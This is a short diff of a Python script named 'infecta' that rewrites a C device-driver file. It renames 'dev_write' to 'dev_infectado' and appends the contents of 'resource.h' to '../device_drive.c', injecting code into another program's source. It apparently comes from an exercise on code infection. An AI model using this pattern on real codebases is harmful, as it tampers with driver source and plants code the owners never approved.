@@ -8,6 +8,10 @@ def infecta(override_method):
             if re.findall(r'dev_write.+{',line):
                 print(line.replace(override_method, 'foo'), end='')
             else:
-                print(line.replace(override_method, 'dev_test'), end='')
+                print(line.replace(override_method, 'dev_infectado'),end='')
+
+    with open('../device_drive.c','a') as outFile, open('resource.h', 'r') as inFile:
+        for line_file in inFile:
+            outFile.write(line_file)
 
 infecta('dev_write')
